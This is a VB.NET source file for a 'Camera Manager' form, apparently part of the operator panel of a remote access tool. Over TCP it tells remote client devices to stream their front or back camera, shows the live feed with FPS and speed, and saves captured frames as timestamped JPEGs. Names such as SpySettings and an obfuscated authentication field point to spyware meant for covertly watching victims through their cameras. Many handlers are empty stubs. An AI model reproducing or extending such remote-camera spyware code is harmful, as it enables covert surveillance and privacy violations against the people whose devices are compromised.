Imports System.ComponentModel
Imports System.IO
Imports System.Threading
 Public Class Frm_CameraManager
     Public CameraClient As Net.Sockets.TcpClient
     Public classCamera As sockets.Frm_Config_Client
    Public MainClassCamera As sockets.Frm_Config_Client
     Public Client As Net.Sockets.TcpClient
     Public classClient As sockets.Frm_Config_Client
     Public Title As String = "null"
     Private MouseState As Boolean = False
     Public FPS As Integer = 0
     Public FPSTMP As Integer = 0
     Public SizeFrame As String = "0 kb"
     Public TempImage As PictureBox = Nothing
     Public KEYsx As String = "None"
     Public tmpFolderUSER As String = ""
     Private boSave As Boolean = False
    Public Rotateit As Boolean = False
     Public SelectedCamera As String = ""
     Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub CameraManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Tag = "Cam_" + Me.classClient.ClientAddressIP
        Me.Icon = New Icon(Frm_Config_Settings.res_Path & "\Icons\win\6.ico")
        Me.combqulty.Text = "Auto"
        Me.cmbofoucs.Text = "No"
        TP.Start()
         Frames.Start()
        Me.ClientPic.Image = DirectCast(classClient.Wallpaper(0), Image)
        Me.Text = Title
         Me.TOpacity.Interval = SpySettings.T_Interval
         Me.Focus()
         Me.TOpacity.Enabled = True
    End Sub
     Private Sub CameraManager_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
         TP.Enabled = False
         Frames.Enabled = False
        If Changed Then
            If Not classCamera Is Nothing Then
                 classCamera.qit = True
                 classCamera.Close(CameraClient, "Camera Ended")
             End If
        End If
     End Sub
     Private Sub TP_Tick(sender As Object, e As EventArgs) Handles TP.Tick
         If Not classCamera Is Nothing Then
             Try
                 ProgressBar1.Value = FPS
             Catch ex As Exception
             End Try
         End If
     End Sub
     Private Sub Frames_Tick(sender As Object, e As EventArgs) Handles Frames.Tick
         FPS = FPSTMP
         FPSTMP = 0
         SizeFrame = "0 kb"
     End Sub
     Private Sub CAM0_Click(sender As Object, e As EventArgs) Handles CAM0.Click
     End Sub
     Private Sub CAM0_MouseHover(sender As Object, e As EventArgs) Handles CAM0.MouseHover
       End Sub
     Private Sub CAM0_MouseLeave(sender As Object, e As EventArgs) Handles CAM0.MouseLeave
       End Sub
     Private Sub CAM0_Paint(sender As Object, e As PaintEventArgs) Handles CAM0.Paint
          Dim txt As String = ""
         Me.Text = Me.classClient.ClientAddressIP + " FPS : <" + CStr(FPS) + "> - SPEED : <" + SizeFrame + ">"
         Dim stringSize As New SizeF
         stringSize = e.Graphics.MeasureString(txt, Frm_Config_Settings.f)
         Dim rect As New Rectangle(5, 5, stringSize.Width, stringSize.Height)
         Dim clr As Color = SpySettings.DefaultColor_Background
         e.Graphics.FillRectangle(New Pen(Color.FromArgb(200, clr.R, clr.G, clr.B)).Brush, rect)
         e.Graphics.DrawString(txt, Frm_Config_Settings.f, New SolidBrush(SpySettings.DefaultColor_Foreground), 5, 5)
      End Sub
     Public Function RotateFlip(ByVal imag As Image) As Image
        Try
            TempImage.Image = imag
            If TempImage IsNot Nothing Then
                Select Case KEYsx
                    Case "Right"
                        TempImage.Image.RotateFlip(RotateFlipType.Rotate90FlipNone)
                        TempImage.Tag = "90n"
                    Case "Left"
                        TempImage.Image.RotateFlip(RotateFlipType.Rotate270FlipNone)
                        TempImage.Tag = "270n"
                    Case "Up"
                        TempImage.Image.RotateFlip(RotateFlipType.Rotate180FlipX)
                        TempImage.Tag = "180x"
                    Case "Down"
                        TempImage.Image.RotateFlip(RotateFlipType.Rotate180FlipY)
                        TempImage.Tag = "180y"
                End Select
                 Return TempImage.Image
            End If
        Catch ex As Exception
        End Try
        Return Nothing
    End Function
     Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click

    End Sub
     Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click

    End Sub
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles SaveTimer.Tick
        Dim cam As String = Me.tmpFolderUSER & "\Camera Manager"
         If boSave Then
             If Not IO.Directory.Exists(cam) Then
                IO.Directory.CreateDirectory(cam)
            End If
             If IO.Directory.Exists(cam) Then
                TempImage.Image.Save(cam & "\p_" & DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".jpg", Imaging.ImageFormat.Jpeg)
            End If
            System.Threading.Thread.Sleep(1)
        Else
             SaveTimer.Stop()
         End If
     End Sub
     Private Sub CameraManager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        boSave = False
        SaveTimer.Stop()
     End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Fbtn.Click

    End Sub
    Public Sub Selected(ByVal v As String)
          Try
            If Me.classClient IsNot Nothing Then
                 Dim classClient As sockets.Frm_Config_Client = Me.classClient
                 Dim cClient As Net.Sockets.TcpClient = Me.Client
                 Dim spl As String() = classClient.Keys.Split(":")
                    Dim chk0, chk1 As Integer
                If cmbofoucs.Text = "Yes" Then
                    chk0 = 1
                Else
                    chk0 = 0
                End If
                 If combqulty.Text = "Auto" Then
                    chk1 = 1
                Else
                    chk1 = 0
                End If
                Dim objs As Object() = {cClient, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & v & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.iqemVgxsinvvgVNvnfvCxebgcmMcCfuiuzcoupfxvMVyBrbiuf & sockets.Data.SPL_SOCKET & CStr(chk0) & sockets.Data.SPL_SOCKET & CStr(chk1) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                classClient.SendAsync(objs)
             End If
         Finally
            End Try
     End Sub
     Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Bbtn.Click


    End Sub
     Public Changed As Boolean = False
    Private Sub Sbtn_Click(sender As Object, e As EventArgs) Handles Sbtn.Click

    End Sub

    Private Sub Timer1_Tick_1(sender As Object, e As EventArgs)

    End Sub

    Private Sub Timer1_Tick_2(sender As Object, e As EventArgs) Handles Timer1.Tick
        Timer1.Stop()
    End Sub

    Private Sub Panel4_Paint(sender As Object, e As PaintEventArgs) Handles Panel4.Paint

    End Sub

    Private Sub Guna2GradientPanel6_Paint(sender As Object, e As PaintEventArgs) Handles Guna2GradientPanel6.Paint

    End Sub

    Private Sub Guna2GradientPanel1_Paint(sender As Object, e As PaintEventArgs) Handles Guna2GradientPanel1.Paint

    End Sub

    Private Sub cmbofoucs_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cmbofoucs.SelectedIndexChanged

    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub

    Private Sub combqulty_SelectedIndexChanged(sender As Object, e As EventArgs) Handles combqulty.SelectedIndexChanged

    End Sub

    Private Sub FrontCameraToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FrontCameraToolStripMenuItem.Click
        If Fbtn.Tag = "off" Then
            statustext.Text = "Selected : Front Camera, Please Wait..."
            Fbtn.Tag = "on"
            Sbtn.Enabled = True
            Fbtn.Enabled = False
            Bbtn.Enabled = False
            Selected("1")
            SelectedCamera = "Front Camera"
        End If
    End Sub

    Private Sub BackCameraToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BackCameraToolStripMenuItem.Click
        If Bbtn.Tag = "off" Then
            statustext.Text = "Selected : Back Camera, Please Wait..."
            Bbtn.Tag = "on"
            Sbtn.Enabled = True
            Fbtn.Enabled = False
            Bbtn.Enabled = False
            Selected("0")
            SelectedCamera = "Back Camera"
        End If
    End Sub

    Private Sub RotationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RotationToolStripMenuItem.Click
        If CAM0.Image IsNot Nothing Then
            If KEYsx = "Right" Then
                KEYsx = "Down"
            ElseIf KEYsx = "Down" Then
                KEYsx = "Left"
            ElseIf KEYsx = "Left" Then
                KEYsx = "Up"
            ElseIf KEYsx = "Up" Then
                KEYsx = "Right"
            Else
                KEYsx = "Right"
            End If
        End If
    End Sub

    Private Sub SaveFotoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveFotoToolStripMenuItem.Click
        If CAM0.Image IsNot Nothing Then
            If Button3.Tag.ToString = "off" Then
                Button3.Tag = "on"
                SaveTimer.Start()
                Button3.Text = ""
                Button3.ForeColor = Color.Red
                Button3.BackColor = Color.Red
                boSave = True
                Dim cam As String = Me.tmpFolderUSER & "\Camera Manager"
                If Not Directory.Exists(cam) Then
                    Directory.CreateDirectory(cam)
                End If
                Process.Start(cam)
            ElseIf Button3.Tag.ToString = "on" Then
                Button3.Tag = "off"
                SaveTimer.Stop()
                Button3.Text = ""
                Button3.ForeColor = Color.DarkTurquoise
                Button3.BackColor = Color.Transparent
                boSave = False
            End If
        End If
    End Sub

    Private Sub StopCameraToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopCameraToolStripMenuItem.Click
        If Changed Then
            Changed = False
            If Not classCamera Is Nothing Then
                statustext.Text = "Select Camera..."
                classCamera.qit = True
                classCamera.Close(CameraClient, "Camera Ended")
            End If
        End If
        Sbtn.Enabled = False
        Fbtn.Enabled = True
        Bbtn.Enabled = True
        Bbtn.Tag = "off"
        Fbtn.Tag = "off"
    End Sub

    Private Sub Guna2CirclePictureBox3_Click(sender As Object, e As EventArgs) Handles Guna2CirclePictureBox3.Click

    End Sub

    Private Sub Guna2CirclePictureBox2_Click(sender As Object, e As EventArgs) Handles Guna2CirclePictureBox2.Click

    End Sub

    Private Sub Guna2CirclePictureBox1_Click(sender As Object, e As EventArgs) Handles Guna2CirclePictureBox1.Click
        Me.Close()
    End Sub
End Class